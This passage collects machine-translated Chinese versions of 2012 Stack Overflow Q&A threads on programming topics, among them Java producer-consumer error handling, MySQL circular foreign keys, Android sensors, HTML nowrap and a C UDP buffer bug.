我需要的是排序哈希表之类的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T11:36:24.067

我假设您不仅想清除列表，而且还想在删除每个项目时对其进行处理。

```
var toDelete = new HashSet<T>();
foreach (var item in sortedItems)
{
    if (!toDelete.Contains(item))
    {
        toDelete.Add(item);
        // do something with item here
    }
    foreach (var dependentFirst in item.DependentElements)
    {
        if (!toDelete.Contains(item))
        {
            toDelete.Add(dependentFirst);
            // do something with item here
        }
    }
}
sortedItems.RemoveAll(i => toDelete.Contains(i)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T11:21:45.793

我认为您应该使用两种数据结构 - 一个堆和一个集合 - 堆用于保存已排序的项目，设置用于保存已删除的项目。用项目填充堆，然后删除顶部的项目，并将其及其所有依赖项添加到集合中。删除第二个 - 如果它已经在集合中，则忽略它并移至第三个，否则将其及其依赖项添加到集合中。

每次您将一个项目添加到集合中时，也要执行您计划对这些项目执行的任何操作。

这里的复杂性是 O(NlogN)，你不会得到比这更好的，因为无论如何你都必须对项目列表进行排序。如果您想获得更好的性能，您可以为每个项目添加一个“已删除”布尔值，并将其设置为 true，而不是使用集合来跟踪已删除的项目。我不知道这是否适用于你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:17:39.533

如果我没记错的话，你想要这样的东西

```
 var dictionary = new Dictionary<string, int>();
            dictionary.Add("car", 2);
            dictionary.Add("apple", 1);
            dictionary.Add("zebra", 0);
            dictionary.Add("mouse", 5);
            dictionary.Add("year", 3);
            dictionary = dictionary.OrderBy(o => o.Key).ToDictionary(o => o.Key, o => o.Value); 
```

# java - 生产者消费者模式 - 处理生产者失败

> ID：10446598
> 
> 赞同：1
> 
> 时间：2012-05-04T09:55:09.897
> 
> 标签：java, multithreading, producer-consumer

我有一个生产者/消费者模式，如下所示

*   固定数量的生产者线程，每个线程都写入自己的 BlockingQueue，通过 Executor 调用
*   单个消费者线程，读取生产者线程

每个生产者都在运行数据库查询并将结果写入其队列。消费者轮询所有生产者队列。目前，如果出现数据库错误，生产者线程会死掉，然后消费者会永远卡住，等待产品队列上的更多结果。

我应该如何构建它以正确处理捕获错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T10:00:49.750

我曾经做过类似的事情，并决定使用一个哨兵值，即将死去的生产者线程将从 catch-block 推入队列。您可以推送异常本身（这在大多数情况下都有效），或者为此设置一个特殊对象。无论如何，将异常推送给消费者以进行调试是非常好的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:28:12.377

无论您实际推送到队列中的是什么类，它都应该包含成功/失败/错误成员，以便消费者可以检查失败。

Peter 已经建议只使用一个队列——我不明白如何避免所有轮询应该是任何特定问题——队列上的对象可以具有标识它们来自哪个生产者的成员，以及任何其他元数据（如果需要）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T09:58:17.653

看来，当生产者死亡时，您唯一的选择就是停止消费者。

为此，您可以使用毒丸。这是生产者在停止时添加的特殊对象，而消费者在收到它时知道要停止。毒丸可以添加到`finally`块中，因此无论生产者如何被杀死/死亡，它都会被添加。

鉴于您只有一个消费者，我会使用一个队列。这样，您的消费者只会阻止所有生产者死亡的地方。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T11:25:53.840

回答我自己的问题。

我使用了以下课程。它需要一个 Runnable 列表并并行执行它们，如果一个失败，它会中断所有其他的。然后我在生产者和消费者中进行中断处理，以便在中断时优雅地死去。

这很适合我的情况。

感谢所有评论/答案，因为他们给了我一些想法。

```
// helper class that does the following
//
// if any thread has an exception then interrupt all the others with an eye to cancelling them
// if the thread calling execute() is interrupted then interrupt all the child threads
public class LinkedExecutor
{
    private final Collection<Runnable> runnables;
    private final String name;

    public LinkedExecutor( String name, Collection<Runnable> runnables )
    {
        this.runnables = runnables;
        this.name = name;
    }

    public void execute()
    {
        ExecutorService executorService = Executors.newCachedThreadPool( ConfigurableThreadFactory.newWithPrefix( name ) );

        // use a completion service to poll the results
        CompletionService<Object> completionService = new ExecutorCompletionService<Object>( executorService );

        for ( Runnable runnable : runnables )
        {
            completionService.submit( runnable, null );
        }

        try
        {
            for ( int i = 0; i < runnables.size(); i++ )
            {
                Future<?> future = completionService.take();
                future.get();
            }
        }
        catch ( InterruptedException e )
        {
            // on an interruption of this thread interrupt all sub-threads in the executor
            executorService.shutdownNow();

            throw new RuntimeException( "Executor '" + name + "' interrupted", e );
        }
        catch ( ExecutionException e )
        {
            // on a failure of any of the sub-threads interrupt all the threads
            executorService.shutdownNow();

            throw new RuntimeException( "Execution execution in executor '" + name + "'", e );
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-04T10:02:43.810

当队列中没有更多元素一段时间后，您可能会添加一些超时来杀死消费者。

另一种方法可能是让生产者维护一个“活动”标志，并通过将其设置为 false 来表示他们正在死亡。如果生产者连续运行但可能并不总是从数据库中获取结果，则“活动”标志可能是生产者上次报告存活的时间，然后使用超时检查生产者是否可能已经死亡（当最后一次报告时）活着太久了）。

# c - 如何在 C 中授予完整文件权限

> ID：10446599
> 
> 赞同：1
> 
> 时间：2012-05-04T09:55:15.343
> 
> 标签：c, file, file-permissions

我正在使用帖子[592448](https://stackoverflow.com/questions/592448/c-how-to-set-file-permissions-cross-platform)中显示的代码示例来尝试授予完整文件权限。当我使用以下代码编译代码片段时：

```
 gcc -shared -mno-cygwin -Wall -o native.dll native.c 
```

我得到以下错误：

```
native.c:8: error: conflicting types for 'mode_t'
/usr/i686-pc-mingw32/sys-root/mingw/include/sys/types.h:99: error: previous declaration of 'mode_t' was here
native.c:21: error: parse error before numeric constant
native.c:22: error: parse error before numeric constant
native.c:23: error: parse error before numeric constant
native.c:25: error: parse error before "mode_t"
native.c:26: error: parse error before "mode_t"
native.c:28: error: parse error before "mode_t"
native.c:29: error: parse error before "mode_t" 
```

我剥离了代码以减少到下面，它编译得很好，但似乎没有根据需要更改文件权限。

```
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>

#ifdef _WIN32
#   include <io.h>

typedef signed int md_t;
static const md_t MS_MODE_MASK = 0x0000ffff;           ///< low word

int fchmod(const char * path, md_t mode)
{
    int result = _chmod(path, (mode & MS_MODE_MASK));

    if (result != 0)
    {
        result = errno;
    }

    return (result);
}
#else
int fchmod(const char * path, md_t mode)
{
    int result = chmod(path, mode);

    if (result != 0)
    {
        result = errno;
    }

    return (result);
}
#endif 
```

关于如何使它工作的任何指示？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T11:05:48.670

请注意，在 Windows 上，所有这一切都可以将文件设置为只读或不设置，Windows 文件权限与 UNIX 类型文件权限不同。

如果这就是您想做的全部：它以什么方式不起作用？

编辑：关于您在其他地方定义的初始错误`mode_t`：`/usr/i686-pc-mingw32/sys-root/mingw/include/sys/types.h:99`并尝试将其重新定义为`typedef int mode_t;`

来自[MSDN](http://msdn.microsoft.com/en-us/library/1z319a54%28v=vs.71%29.aspx)：

> If write permission is not given, the file is read-only. Note that all files are always readable; it is not possible to give write-only permission. Thus the modes _S_IWRITE and _S_IREAD | _S_IWRITE are equivalent.

# rest - 有没有人尝试使用 Asana API 进行备份

> ID：10446606
> 
> 赞同：3
> 
> 时间：2012-05-04T09:55:50.230
> 
> 标签：rest, backup, asana

我有兴趣使用 Asana API 备份 Asana 工作区。这可能吗？那里可能面临哪些问题。如果你有一个可行的解决方案，有人可以分享一下吗？

如果有任何其他方法建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-08T03:29:51.323

Asana 已经提供了一种以 JSON 格式导出项目任务的方法。

导出：选择要导出的项目；它将在中心窗格中加载 单击中心窗格顶部的向下箭头 选择以 JSON 格式查看

您可以通过完成他们的出口调查来帮助 Asana 改进他们的功能[https://docs.google.com/forms/d/1gM9l74LSO8ZchcKy3f89d_6C2uVZ5yeeiQHsq1jAAO8/viewform](https://docs.google.com/forms/d/1gM9l74LSO8ZchcKy3f89d_6C2uVZ5yeeiQHsq1jAAO8/viewform)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-17T02:32:29.800

我亲自尝试过，但是在寻找使用 API 自己进行备份的东西时遇到了它：

[http://mackerelsky.co.nz/new-version-asana-export-tool/](http://mackerelsky.co.nz/new-version-asana-export-tool/)

# virtual-machine - 在传输之前存档 Opennebula 图像并在之后提取

> ID：10446608
> 
> 赞同：0
> 
> 时间：2012-05-04T09:55:56.067
> 
> 标签：virtual-machine, xen, kvm

我有通过 ssh 传输的 opennebula 3.4 和 vm 图像，是否可以存档图像（使用 gzip）并传输到主机然后提取图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-01T18:55:01.773

您必须创建新的传输管理器。在这里阅读更多[http://opennebula.org/documentation:rel3.4:sd](http://opennebula.org/documentation:rel3.4:sd)

# android - Android中的“重力”和“加速度”传感器有什么区别？

> ID：10446610
> 
> 赞同：22
> 
> 时间：2012-05-04T09:56:04.540
> 
> 标签：android, accelerometer, android-sensors, gravity

Android中的重力和加速度传感器有什么区别？从我的角度来看，两种情况下的物理价值是相同的。

哪一项测量作用在设备内部单位质量上的力？

**添加**

问题是：这些传感器测量的是什么物理量？根据[等效原理](http://en.wikipedia.org/wiki/Equivalence_principle)，加速度和重力是无法区分的，测量两者的唯一方法是通过通常的（但 3d）弹簧平衡。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-04T10:43:59.603

加速度传感器为您返回施加在设备上的所有力的总和，而重力传感器仅返回重力的影响。如果您想从加速度中排除重力，您可以使用高通滤波器或只是从加速度传感器值中减去重力传感器值 - 不确定哪种方法可以提供更好的精度。

另一种方法可能是使用 Sensor.TYPE_LINEAR_ACCELERATION，它准确地给出（加速度 - 重力），但是您应该检查它是否在设备上可用。我发现了一些设备，它们有 ACCELERATION 传感器工作，但 GRAVITY 或 LINEAR_ACCELERATION 传感器没有响应。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-15T23:38:08.183

此链接可能会有所帮助：[http ://www.sensorplatforms.com/which-sensors-in-android-gets-direct-input-what-are-virtual-sensors](http://www.sensorplatforms.com/which-sensors-in-android-gets-direct-input-what-are-virtual-sensors)

以下摘录总结了您问题的答案：

“列表......包括物理传感器和传感器类型，其值来自物理传感器，有时这些被称为虚拟传感器......虚拟传感器类型（重力、线性加速度和旋转矢量）提供通过组合结果得出的值智能地从物理传感器...旋转矢量是加速度计、磁力计、有时是陀螺仪的组合，用于确定 Android 设备相对于地球框架坐标的三维角度。通过了解旋转矢量在设备中，加速度计数据可以分为重力加速度和线性加速度。”

这个链接[https://stackoverflow.com/a/8238389/604964](https://stackoverflow.com/a/8238389/604964)还说重力值是使用巴特沃斯滤波器计算的。

# css - 包含样式表时 XSL 文件导致错误

> ID：10446611
> 
> 赞同：0
> 
> 时间：2012-05-04T09:56:15.010
> 
> 标签：css, xml, xslt, google-chrome

我有一个带有类似代码的 XML 文件

```
 <?xml version="1.0" encoding="UTF-8"?> <?xml-stylesheet href="rss2.xsl" type="text/xsl" media="screen"?> <rss version="2.0">   <channel>
        <title>TITLE</title>
        <description>Description</description>
        <link>
        some link
        </link>
        <copyright>Copyrights 2012, All Rights Reserved</copyright>
        <item>
        <title> title 1</title>
        <description> desc</description>
        <link>
        some link
        </link>
        </item>   </channel> </rss> 
```

为此的 XSL 文件是

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html" />

<xsl:template match="/">
  <html>
  <head>
    <title>XML RSS Feed</title>
    <link type="text/css" rel="stylesheet" href="rss_xsl.css" >
  </head>
  <body>
  <h2>XML RSS Feed</h2>
  <hr />

    <div id="content">
      <xsl:for-each select="rss/channel/item">
      <div class="article">
        <h3><a href="{link}" rel="bookmark"><xsl:value-of select="title"/></a></h3>
        <p><xsl:value-of select="description"/></p>
      </div>
      </xsl:for-each>
    </div>

</body>
</html>
</xsl:template>
</xsl:stylesheet> 
```

问题是当我评论样式表代码时，chrome 会显示提要。当我包含样式时，提要不再可见。这怎么能停止显示提要。他们在 XSL 文件中包含 Style 有什么问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:17:36.673

那么样式表标记的格式不正确，`<link type="text/css" rel="stylesheet" href="rss_xsl.css" >`因此应该是`<link type="text/css" rel="stylesheet" href="rss_xsl.css"/>`. 然后我认为该方法在通过 HTTP 加载时有效。如果您从文件系统加载 XML 文档，那么出于安全原因，我认为 Chrome 拒绝加载链接到的样式表。可能有命令行选项或设置来更改行为。

# c# - Asp.net, Jcrop 价值问题

> ID：10446621
> 
> 赞同：0
> 
> 时间：2012-05-04T09:56:48.683
> 
> 标签：c#, asp.net, jcrop

我试图让 Jcrop 与 Asp.net 一起工作，但我认为我有一个问题：

```
Convert.ToInt32(W.Value); 
```

我在我的 aspx 页面中使用隐藏字段。我尝试使用常规输入字段，然后编写了一个请求表单来获取所有值，这很有效。但我无法让它与隐藏字段和 Convert.ToInt32(W.Value) 一起使用。当我尝试这种方式时，该值似乎总是为空。我得到消息：输入的格式不正确。

我的背后代码如下所示：

```
protected void btnCrop_Click(object sender, EventArgs e)
{
    string ImageName = Request.QueryString["upload"];
    String path = "~/Members/TemporaryProfilePhotos/";

    int w = Convert.ToInt32(W.Value);
    int h = Convert.ToInt32(H.Value);
    int x = Convert.ToInt32(X.Value);
    int y = Convert.ToInt32(Y.Value);

    byte[] CropImage = Crop(path + ImageName, w, h, x, y);

    using (MemoryStream ms = new MemoryStream(CropImage, 0, CropImage.Length))
    {
        ms.Write(CropImage, 0, CropImage.Length);
        using (SD.Image CroppedImage = SD.Image.FromStream(ms, true))
        {
            string SaveTo = path + "crop" + ImageName;
            CroppedImage.Save(SaveTo, CroppedImage.RawFormat);
        }
    }
}

static byte[] Crop(string Img, int Width, int Height, int X, int Y)
{
  try {
    using (SD.Image OriginalImage = SD.Image.FromFile(Img)) {
      using (SD.Bitmap bmp = new SD.Bitmap(Width, Height)) {
        bmp.SetResolution(OriginalImage.HorizontalResolution,
          OriginalImage.VerticalResolution);

        using (SD.Graphics Graphic = SD.Graphics.FromImage(bmp)) {
          Graphic.SmoothingMode = SmoothingMode.AntiAlias;
          Graphic.InterpolationMode = InterpolationMode.HighQualityBicubic;
          Graphic.PixelOffsetMode = PixelOffsetMode.HighQuality;
          Graphic.DrawImage(OriginalImage,
            new SD.Rectangle(0, 0, Width, Height),
            X, Y, Width, Height, SD.GraphicsUnit.Pixel);
          MemoryStream ms = new MemoryStream();
          bmp.Save(ms, OriginalImage.RawFormat);
          return ms.GetBuffer();
        }
      }
    }
  }

  catch (Exception Ex) {
    throw (Ex);
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:03:22.530

如果您将 设置`Visible property`为`false;`通常在页面之后`.net`将`control`不会在`HTML`输出中呈现`processed`

所以你可以尝试使用隐藏字段`style="visibility: hidden; display: none;"`

# vb6 - VB6可以使用数据集吗？

> ID：10446624
> 
> 赞同：1
> 
> 时间：2012-05-04T09:56:55.120
> 
> 标签：vb6, dataset

VB6可以使用数据集吗？如果是，那么它的参考库是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T09:35:20.163

您可以使用 ADODB.RecordSet 而不是数据集，您可以[从此处获取有关 ADODB.RecordSet 的更多信息。](http://www.w3schools.com/ado/ado_ref_recordset.asp)

# html - 属性“nowrap”被认为是过时的。建议使用较新的构造。它是什么？

> ID：10446639
> 
> 赞同：79
> 
> 时间：2012-05-04T09:57:53.897
> 
> 标签：html, css, visual-studio-2010, compiler-errors, nowrap

使用 Visual Studio 2010 在 ASPX 页面中编译时出现错误：

```
 <td valign="top" nowrap width="237"> 
```

错误信息是

```
 "Attribute 'nowrap' is considered outdated. A newer construct is recommended." 
```

错误消息指的是什么构造？它的行为是否与“nowrap”完全相同？

* * *

## 回答 #1

> 赞同：131
> 
> 时间：2012-05-04T10:04:29.880

你可以这样使用它，我希望你现在不会收到过时的消息。

```
 <td valign="top" style="white-space:nowrap" width="237"> 
```

正如@ThiefMaster 所指出的，建议将其放置`width`和对齐到 CSS（注意：CSS 调用它`vertical-align`）。

**1)**

```
<td style="white-space:nowrap; width:237px; vertical-align:top;"> 
```

**2）** 我们可以像这样制作一个 CSS 类，它是更优雅的方式

在风格部分

```
.td-some-name
{
  white-space:nowrap;
  width:237px;
  vertical-align:top;
} 
```

在 HTML 部分

```
<td class="td-some-name"> 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-05-04T11:12:34.110

有几种[方法可以尝试防止换行符](http://www.cs.tut.fi/~jkorpela/html/nobr.html#prevent)，并且短语“更新的构造”可能指的不止一种方式——这实际上是最合理的解释。他们可能主要想到的是 CSS 声明`white-space:nowrap`，可能还有不间断的空格字符。不同的方式*并不*等同，远非如此，无论是在理论上还是在实践中，尽管在某些特定情况下，不同的方式可能会产生相同的结果。

从 HTML 属性切换到稍微笨拙的 CSS 方式可能并没有什么真正的收获，而且当样式表被禁用时，你肯定会失败。但即使该`nowrap`属性在所有情况下都不起作用。一般来说，最广泛使用的是`nobr`标记，它从未进入任何规范，但仍然活跃且活跃：`<td><nobr>...</nobr></td>`.

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2017-05-25T17:45:13.403

如果 HTML 并使用引导程序，它们有一个[辅助类](https://getbootstrap.com/docs/3.3/css/#type-alignment)。

```
<span class="text-nowrap">1-866-566-7233</span> 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-05-04T10:13:42.813

虽然有 CSS 定义了一个[text-wrap](http://www.w3schools.com/cssref/css3_pr_text-wrap.asp)属性，但它不被任何主流浏览器支持，但也许广泛支持[的 white-space](http://www.w3schools.com/cssref/pr_text_white-space.asp)属性可以解决你的问题。

# objective-c - UDP客户端两次打印接收到的数据[即接收到的数据被附加到自身两次]

> ID：10446640
> 
> 赞同：0
> 
> 时间：2012-05-04T09:57:59.577
> 
> 标签：objective-c, sockets, udp

目标：我正在制作一个 UDP 套接字来发送和接收数据。我正在我的笔记本电脑上对此进行测试，所以我有一个在后台运行的服务器，它监听传入的消息并将其回显。

问题：我看到服务器收到一个字符串，当它回显时，客户端读取字符串 2 次而不是 ONE 并添加乱码。如何解决这个问题？

代码的输出是：HelloHello09[顺便说一句，我在 09 前面和后面都有一些倒置的问号，但我不能粘贴它，lolz]

代码：

```
#define BUFLEN 5
#define PORT 12345

#import <Foundation/Foundation.h>

#define srvr_IP "127.0.0.1"

void errorSig(char *); 

int main (int argc, const char * argv[])
{
int sockSend = socket(AF_INET, SOCK_DGRAM, 0);
struct sockaddr_in si_other;

char buf[BUFLEN] = "Hello";
char bufrec[BUFLEN]; 

@autoreleasepool {

    si_other.sin_family = AF_INET; 
    si_other.sin_port = htons(PORT);
    inet_pton(AF_INET, srvr_IP, &si_other.sin_addr); 
    memset(&si_other.sin_zero, 0, sizeof(si_other.sin_zero));

    int size = sizeof(si_other); 
    sendto(sockSend, buf, BUFLEN, 0,
           (struct sockaddr *)&si_other, size);

    recvfrom(sockSend, bufrec, BUFLEN, 0, (struct sockaddr *)&si_other, (unsigned int*)&size); 
    NSString *test = [[NSString alloc]initWithUTF8String:bufrec];
    NSLog(@" data is: %@", test); 

    close(sockSend); 
    }
return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:16:29.973

我刚刚看到您实际上确实将 BUFLEN 定义为 5（抱歉，当我在上面写我的评论时我错过了）。正如我所怀疑的，您有一个 NULL 终止问题。C 中字符串的长度比您要存储的字符数多一，以便为指示字符串结尾的 NULL 终止符腾出空间。

将您的 BUFLEN 定义更改为 6，您应该会发现它工作得更好。

# mysql - 在SQL中，两个表可以互相引用吗？

> ID：10446641
> 
> 赞同：44
> 
> 时间：2012-05-04T09:58:01.353
> 
> 标签：mysql, database, database-design

在这个系统中，我们存储产品、产品图像（一个产品可以有多个图像）和一个产品的默认图像。数据库：

```
CREATE TABLE  `products` (
  `ID` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `NAME` varchar(255) NOT NULL,
  `DESCRIPTION` text NOT NULL,
  `ENABLED` tinyint(1) NOT NULL DEFAULT '1',
  `DATEADDED` datetime NOT NULL,
  `DEFAULT_PICTURE_ID` int(10) unsigned DEFAULT NULL,
  PRIMARY KEY (`ID`),
  KEY `Index_2` (`DATEADDED`),
  KEY `FK_products_1` (`DEFAULT_PICTURE_ID`),
  CONSTRAINT `FK_products_1` FOREIGN KEY (`DEFAULT_PICTURE_ID`) REFERENCES `products_pictures` (`ID`) ON DELETE SET NULL ON UPDATE SET NULL
) ENGINE=InnoDB AUTO_INCREMENT=30 DEFAULT CHARSET=utf8;

CREATE TABLE  `products_pictures` (
  `ID` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `IMG_PATH` varchar(255) NOT NULL,
  `PRODUCT_ID` int(10) unsigned NOT NULL,
  PRIMARY KEY (`ID`),
  KEY `FK_products_pictures_1` (`PRODUCT_ID`),
  CONSTRAINT `FK_products_pictures_1` FOREIGN KEY (`PRODUCT_ID`) REFERENCES `products` (`ID`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC; 
```

如您所见，`products_pictures.PRODUCT_ID -> products.ID`和`products.DEFAULT_PICTURE_ID -> products_pictures.ID`，因此是循环参考。可以吗？

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2012-05-05T01:45:20.687

不，这不好。表之间的循环引用很混乱。请参阅这篇（十年前的）文章：[SQL By Design: The Circular Reference](https://www.itprotoday.com/sql-design-circular-reference)

一些 DBMS 可以处理这些，并且要特别小心，但是 MySQL 会有问题。

* * *

**选项1**

作为您的设计，使两个 FK 之一可以为空。这使您可以解决先有鸡还是先有蛋的问题（我应该首先插入哪个表？）。

虽然你的代码有问题。它将允许产品具有默认图片，该图片将引用另一个产品！

要禁止此类错误，您的 FK 约束应为：

```
CONSTRAINT FK_products_1 
  FOREIGN KEY (id, default_picture_id) 
  REFERENCES products_pictures (product_id, id)
  ON DELETE RESTRICT                            --- the SET NULL options would 
  ON UPDATE RESTRICT                            --- lead to other issues 
```

这将需要表中的`UNIQUE`约束/索引才能定义上述 FK 并正常工作。`products_pictures``(product_id, id)`

* * *

**选项 2**

另一种方法是从表中删除`Default_Picture_ID`列并在`product`表中添加一`IsDefault BIT`列`picture`。这个解决方案的问题是如何只允许每个产品的一张图片打开那个位，而所有其他的都关闭它。在 SQL-Server（我认为是 Postgres）中，这可以通过部分索引来完成：

```
CREATE UNIQUE INDEX is_DefaultPicture 
  ON products_pictures (Product_ID)
  WHERE IsDefault = 1 ; 
```

但是 MySQL 没有这样的特性。

* * *

**选项 3**

这种方法甚至允许您将两个 FK 列定义为`NOT NULL`使用可延迟约束。这适用于 PostgreSQL，我认为适用于 Oracle。检查这个问题和@Erwin 的答案：[SQLAlchemy 中的复杂外键约束](https://stackoverflow.com/questions/8394177/complex-foreign-key-constraint-in-sqlalchemy/8395021#8395021)（**所有键列不为空**部分）。

MySQL 中的约束不能延迟。

* * *

**选项 4**

方法（我觉得最干净）是删除`Default_Picture_ID`列并添加另一个表。FK 约束中没有圆形路径，所有 FK 列都将`NOT NULL`使用此解决方案：

```
product_default_picture
----------------------
product_id          NOT NULL
default_picture_id  NOT NULL
PRIMARY KEY (product_id)
FOREIGN KEY (product_id, default_picture_id)
  REFERENCES products_pictures (product_id, id) 
```

与解决方案 1 一样，这也需要表中的`UNIQUE`约束/索引。`products_pictures``(product_id, id)`

* * *

**总而言之，使用 MySQL，您有两种选择：**

*   选项 1（可以为空的 FK 列）与上述更正以正确执行完整性

*   选项 4（无可为空的 FK 列）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-04T10:01:25.323

这只是建议，但如果可能，在此表之间创建一个连接表可能有助于跟踪

```
product_productcat_join
------------------------
ID(PK)
ProductID(FK)- product table primary key
PictureID(FK) - category table primary key 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-04T10:04:11.547

您将遇到的唯一问题是插入时。你先插入哪个？

有了这个，你将不得不做类似的事情：

*   插入默认图片为空的产品
*   使用新创建的产品 ID 插入图片
*   更新产品以将默认图片设置为您刚刚插入的图片。

同样，删除不会很有趣。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-03-29T03:28:28.567

在另一个表中，您可以只保存该字段而没有外键约束。在某些情况下，当您希望使用较小的表进行处理但使用处理结果连接到较大的表时，它很有用。

例如，如果您添加一个 product_location 表，其中包含国家、地区、城市、地址以及经度和纬度信息。可能存在您想在地图上的圆圈内显示产品的情况。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-05T02:00:54.153

约翰，你所做的并没有什么不好，但使用 PK-FK 实际上有助于通过删除冗余重复数据来规范化你的数据。这有一些奇妙的优势

*   由于消除了相同数据的重复存储位置，提高了数据完整性
*   减少锁定争用并提高多用户并发性
*   较小的文件

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2012-05-04T10:00:02.350

那不是循环引用，即 pk-fk

# asp.net - textarea 滚动条删除自动换行/换行

> ID：10446647
> 
> 赞同：1
> 
> 时间：2012-05-04T09:58:42.623
> 
> 标签：asp.net, html

一直在寻找但没有找到解决方案。

我有一个 textarea，asp:textbox，我尝试删除文本放置在第二行而不用户进行换行的行为。我希望它继续在同一行上，即使文本框本身不够大，只要用户不按回车键就无法显示所有文本。

```
runat="server" Width="387" Height="40px" TextMode="MultiLine" onkeypress="MaxTwohundred(this);" Rows="2" style="overflow-x: scroll; overflow-y: 
```

实现此目的的正确方法是什么？

white-space:nowrap 不能解决问题。然后用户不能通过按返回按钮来进行简单的换行。

谢谢。

编辑

谢谢蒂姆梅多拉，它有效。

贝娄是我用的。

```
 TextMode="MultiLine" 
                style="overflow-x: scroll; overflow-y: hidden; " wrap="false" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:01:39.370

请参阅此示例：http: [//jsfiddle.net/nDtpL/4/](http://jsfiddle.net/nDtpL/4/)

虽然使用 CSS 来控制这种行为会很好`white-space`，但浏览器支持不一致（见评论）。相反，我`wrap="off"`用来获得所需的行为（至少在我对 Chrome、IE 9（和 7 8 仿真模式）和 FF 的快速测试中）。

这是一个类似的线程：[enter doesn't work in textarea in Internet Explorer 8](https://stackoverflow.com/questions/1282202/enter-does-not-work-in-textarea-in-internet-explorer-8)

# javascript - Magento - 这个 javascript 文件没有正确合并

> ID：10446648
> 
> 赞同：0
> 
> 时间：2012-05-04T09:58:42.733
> 
> 标签：javascript, optimization, drop-down-menu, magento-1.6

我有一个 magento 1.6.2 网上商店。

我想合并 javascript 文件以优化我的加载速度。但是当我在设置中选择合并时，我的自定义菜单扩展不再起作用。

我猜代码有问题。我试图联系开发商，但我没有得到任何反应...

此扩展程序用于顶部的导航菜单（带图像）

这是 custommenu.js 文件的代码：

```
 function wpShowMenuPopup(objMenu, popupId)
{
    objMenu = $(objMenu.id); var popup = $(popupId); if (!popup) return;
    popup.style.display = 'block';
    objMenu.addClassName('active');
    var popupWidth = CUSTOMMENU_POPUP_WIDTH;
    if (!popupWidth) popupWidth = popup.getWidth();
    var pos = wpPopupPos(objMenu, popupWidth);
    popup.style.top = pos.top + 'px';
    popup.style.left = pos.left + 'px';
    if (CUSTOMMENU_POPUP_WIDTH) popup.style.width = CUSTOMMENU_POPUP_WIDTH + 'px';
}

function wpPopupPos(objMenu, w)
{
    var pos = objMenu.cumulativeOffset();
    var wraper = $('custommenu');
    var posWraper = wraper.cumulativeOffset();
    var wWraper = wraper.getWidth() - CUSTOMMENU_POPUP_RIGHT_OFFSET_MIN;
    var xTop = pos.top - posWraper.top + CUSTOMMENU_POPUP_TOP_OFFSET;
    var xLeft = pos.left - posWraper.left;
    if ((xLeft + w) > wWraper) xLeft = wWraper - w;
    return {'top': xTop, 'left': xLeft};
}

function wpHideMenuPopup(element, event, popupId, menuId)
{
    element = $(element.id); var popup = $(popupId); if (!popup) return;
    var current_mouse_target = null;
    if (event.toElement)
    {
        current_mouse_target = event.toElement;
    }
    else if (event.relatedTarget)
    {
        current_mouse_target = event.relatedTarget;
    }
    if (!wpIsChildOf(element, current_mouse_target) && element != current_mouse_target)
    {
        if (!wpIsChildOf(popup, current_mouse_target) && popup != current_mouse_target)
        {
            popup.style.display = 'none';
            $(menuId).removeClassName('active');
        }
    }
}

function wpIsChildOf(parent, child)
{
    if (child != null)
    {
        while (child.parentNode)
        {
            if ((child = child.parentNode) == parent)
            {
                return true;
            }
        }
    }
    return false;
} 
```

你可以在我的网上商店看到它：[www.liefstoereigenwijs.nl](http://www.liefstoereigenwijs.nl)

谁能看看代码中是否有问题？或者对我的问题有其他解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T18:48:35.593

结束每个

```
function xx(x)
{
  ...
} 
```

以a`;`结尾！

所以：

```
function xx(x)
{
  ...
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-07T21:01:27.823

问题在 1.7.0.2 中自动解决

# android - 分段的 ListView 不显示任何内容

> ID：10446651
> 
> 赞同：0
> 
> 时间：2012-05-04T09:59:03.373
> 
> 标签：android, list

我的代码没有错误，但是当我运行应用程序时，屏幕只是空白。

有没有人知道为什么会这样？
我的目标是，一旦我完成了这项工作，我想将来自 json 提要的数据添加到其中。

这是我的活动：

```
import android.app.ListActivity;
import android.content.Context;
import android.database.CharArrayBuffer;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.MediaStore.Audio.Media;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CursorAdapter;
import android.widget.ListView;
